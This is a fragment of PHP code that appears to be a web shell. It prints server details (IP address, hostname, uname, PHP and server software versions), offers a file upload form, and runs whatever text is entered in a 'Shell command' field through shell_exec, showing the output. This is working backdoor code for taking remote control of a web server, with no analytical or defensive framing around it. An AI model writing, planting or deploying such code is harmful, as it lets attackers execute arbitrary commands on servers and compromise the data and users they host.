...
echo "<b>Server IP:</b> $server_ip <small>($server_hostname)</small><br><b>PHP Uname:</b> $php_uname<br><b>PHP Version:</b> $php_version<br><b>Server Software:</b> $server_software<br><hr>";
echo "<b>Path:</b> ";
...
echo "<form method=post enctype='multipart/form-data' style='display:inline;'><input type=file name=fileup required><button type=submit>Upload</button></form> ";

echo "<form method='post' style='display:inline;margin-left:10px;'><input type='text' name='command' placeholder='Shell command' style='width:200px;' required><button type='submit'>Press</button></form>";

if(isset($_POST['command'])) {
    $cmd = $_POST['command'];
    $output = shell_exec($cmd . " 2>&1");
    echo "<div style='background:#222;color:#eee;padding:7px;margin:10px 0;'><b>&gt; ".htmlspecialchars($cmd)."</b><pre style='white-space:pre-wrap;'>".htmlspecialchars($output)."</pre></div>";
}
